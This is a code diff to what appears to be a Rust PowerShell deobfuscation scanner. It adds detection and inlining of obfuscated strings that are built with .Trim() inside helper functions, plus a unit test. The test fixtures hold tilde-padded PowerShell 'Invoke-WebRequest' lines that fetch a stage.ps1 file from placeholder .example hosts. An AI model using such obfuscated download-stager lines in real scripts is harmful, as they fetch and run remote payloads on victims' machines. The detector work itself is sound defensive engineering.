@@ -968,6 +968,14 @@ static PS_LITERAL_DOT_REPLACE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_LITERAL_TRIM_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)(?:\breturn\s+)?\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*Trim\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
+    )
+    .expect("ps literal trim extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_LITERAL_SPLIT_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)(?:\breturn\s+)?\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*Split\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
@@ -3305,6 +3313,37 @@ fn expand_literal_replace_extractor_calls(text: &str) -> String {
     out
 }
 
+fn expand_literal_trim_extractor_calls(text: &str) -> String {
+    let lower = text.to_ascii_lowercase();
+    if !lower.contains("function ") || !lower.contains(".trim") || !text.contains('\'') {
+        return text.to_string();
+    }
+
+    let mut out = text.to_string();
+    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
+        let Some(caps) = PS_LITERAL_TRIM_EXTRACTOR_BODY_RE.captures(&body) else {
+            continue;
+        };
+        let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(chars_var) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+
+        let param_index = parse_ps_function_param_indices(&params);
+        let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+        let Some(chars_idx) = param_index.get(&chars_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+
+        out = inline_ps_literal_trim_calls(&out, &name, value_idx, chars_idx);
+    }
+    out
+}
+
 fn expand_literal_split_index_extractor_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
     if !lower.contains("function ")
@@ -3606,6 +3645,91 @@ fn inline_ps_literal_replace_calls(
             continue;
         }
         let replacement = format!("'{}'", replaced.replace('\'', "''"));
+        matches.push((call_start, call_end, replacement));
+        search_from = call_end;
+        match_count += 1;
+    }
+
+    let mut out = text.to_string();
+    for (start, end, replacement) in matches.into_iter().rev() {
+        out.replace_range(start..end, &replacement);
+    }
+    out
+}
+
+fn inline_ps_literal_trim_calls(
+    text: &str,
+    name: &str,
+    value_idx: usize,
+    chars_idx: usize,
+) -> String {
+    let lower = text.to_ascii_lowercase();
+    let needle_name = name.to_ascii_lowercase();
+    let bytes = text.as_bytes();
+    let mut matches = Vec::new();
+    let mut search_from = 0;
+    let mut match_count = 0;
+
+    while match_count < 128 {
+        let Some(rel) = lower[search_from..].find(&needle_name) else {
+            break;
+        };
+        let call_start = search_from + rel;
+        let end_name = call_start + name.len();
+        if is_ident_byte(bytes.get(call_start.wrapping_sub(1)).copied())
+            || is_ident_byte(bytes.get(end_name).copied())
+        {
+            search_from = end_name;
+            continue;
+        }
+
+        let mut pos = skip_ascii_ws(bytes, end_name);
+        let parenthesized = bytes.get(pos) == Some(&b'(');
+        if parenthesized {
+            pos = skip_ascii_ws(bytes, pos + 1);
+        }
+        let Some((first_end, first)) = parse_ps_static_quoted_literal(text, pos) else {
+            search_from = end_name;
+            continue;
+        };
+        if first.len() > 8192 {
+            search_from = first_end;
+            continue;
+        }
+        pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
+        let Some((second_end, second)) = parse_ps_static_quoted_literal(text, pos) else {
+            search_from = first_end;
+            continue;
+        };
+        let mut call_end = second_end;
+        if parenthesized {
+            let after = skip_ascii_ws(bytes, call_end);
+            if bytes.get(after) != Some(&b')') {
+                search_from = second_end;
+                continue;
+            }
+            call_end = after + 1;
+        }
+
+        let args = [&first, &second];
+        let Some(value) = args.get(value_idx).copied() else {
+            search_from = call_end;
+            continue;
+        };
+        let Some(chars) = args.get(chars_idx).copied() else {
+            search_from = call_end;
+            continue;
+        };
+        if chars.is_empty() {
+            search_from = call_end;
+            continue;
+        }
+        let trimmed = value.trim_matches(|ch| chars.contains(ch));
+        if trimmed.len() > 8192 {
+            search_from = call_end;
+            continue;
+        }
+        let replacement = format!("'{}'", trimmed.replace('\'', "''"));
         matches.push((call_start, call_end, replacement));
         search_from = call_end;
         match_count += 1;
@@ -4123,6 +4247,9 @@ fn expand_obfuscation(text: &str) -> String {
             if signals.dot_replace {
                 out = expand_ps_dot_replace(&out);
             }
+            if signals.trim_extractor {
+                out = expand_literal_trim_extractor_calls(&out);
+            }
             if signals.substring {
                 out = expand_ps_dot_substring(&out);
                 out = expand_literal_substring_extractor_calls(&out);
@@ -4229,6 +4356,9 @@ fn expand_obfuscation(text: &str) -> String {
             if signals.dot_replace {
                 out = expand_ps_dot_replace(&out);
             }
+            if signals.trim_extractor {
+                out = expand_literal_trim_extractor_calls(&out);
+            }
             if signals.substring {
                 out = expand_ps_dot_substring(&out);
                 out = expand_literal_substring_extractor_calls(&out);
@@ -4283,6 +4413,7 @@ struct PsObfuscationSignals {
     argument_list: bool,
     invoke_wrapper: bool,
     dot_replace: bool,
+    trim_extractor: bool,
     substring: bool,
     split_index: bool,
     embedded_single_quote_assignment: bool,
@@ -4317,6 +4448,7 @@ impl PsObfuscationSignals {
             lower.contains("function ") || lower.contains("-name ") || lower.contains("-n ");
         let invoke_wrapper = has_function_def && lower.contains("invoke-expression");
         let dot_replace = lower.contains(".replace");
+        let trim_extractor = has_function_def && lower.contains(".trim");
         let substring = lower.contains(".substring");
         let split_index =
             has_function_def && has_split_index_extractor_signal(&lower) && text.contains('[');
@@ -4361,6 +4493,7 @@ impl PsObfuscationSignals {
             argument_list,
             invoke_wrapper,
             dot_replace,
+            trim_extractor,
             substring,
             split_index,
             embedded_single_quote_assignment,
@@ -4392,6 +4525,7 @@ impl PsObfuscationSignals {
         self.argument_list
             || self.invoke_wrapper
             || self.dot_replace
+            || self.trim_extractor
             || self.substring
             || self.split_index
             || self.embedded_single_quote_assignment
@@ -6272,7 +6406,8 @@ mod literal_substring_extractor_tests {
     use super::{
         expand_doubled_quote_literals, expand_literal_replace_extractor_calls,
         expand_literal_split_index_extractor_calls, expand_literal_substring_extractor_calls,
-        literal_substring_extractor_defs, PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE,
+        expand_literal_trim_extractor_calls, literal_substring_extractor_defs,
+        PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE,
     };
 
     #[test]
@@ -6327,6 +6462,21 @@ Clean 'I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~r~e~p
         assert!(
             out.contains("'Invoke-WebRequest -Uri https://ps-replace-extractor.example/stage.ps1'"),
             "replace extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_trim_extractor_call_is_rewritten() {
+        let text = r#"function Clean($value,$chars) {
+  return $value.Trim($chars)
+}
+Clean '~~~Invoke-WebRequest -Uri https://ps-trim-extractor.example/stage.ps1~~~' '~'"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains("'Invoke-WebRequest -Uri https://ps-trim-extractor.example/stage.ps1'"),
+            "trim extractor call was not rewritten:\n{out}"
         );
     }
 
